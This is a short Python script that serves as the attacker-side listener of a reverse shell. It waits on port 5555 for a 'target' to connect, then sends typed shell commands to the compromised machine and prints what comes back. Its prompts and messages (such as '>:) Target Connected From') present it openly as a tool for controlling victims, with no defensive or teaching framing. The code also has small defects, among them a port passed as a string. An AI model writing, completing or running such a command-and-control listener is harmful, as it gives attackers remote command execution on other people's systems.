import socket
import json

def send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

def recieve():
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


def target_comm():
    while True:
        command = input('* Shell~%s: ' %str(ip))
        send(command)
        if command == 'quit':
            break
        else:
            result = recieve()
            print(result) 

sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sock.bind(('Enter your ip','5555'))
print(':) Listening for connections...')
sock.listen(5)
target,ip = sock.accept()
print('>:) Target Connected From' + str(ip))
target_comm()